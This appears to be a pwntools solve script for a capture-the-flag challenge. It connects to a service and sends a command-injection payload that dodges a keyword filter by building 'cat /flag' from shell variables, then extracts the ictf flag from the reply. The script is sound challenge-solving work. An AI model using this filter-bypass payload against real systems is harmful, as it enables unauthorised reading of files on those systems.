#!/usr/bin/env python3
import re
import sys

from pwn import remote


def main() -> None:
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} HOST PORT", file=sys.stderr)
        raise SystemExit(2)

    host = sys.argv[1]
    port = int(sys.argv[2])

    io = remote(host, port)

    # The service prompts with "...command:"
    io.recvuntil(b"command:")

    # Avoid forbidden substrings by assembling them via shell variables.
    payload = b'F="/fl"; G="ag"; H="c"; I="at"; $H$I $F$G'
    io.sendline(payload)

    data = io.recvall(timeout=2)
    m = re.search(rb"ictf\{[^}]+\}", data)
    if not m:
        print(data.decode(errors="replace"))
        raise SystemExit(1)

    print(m.group(0).decode())


if __name__ == "__main__":
    main()

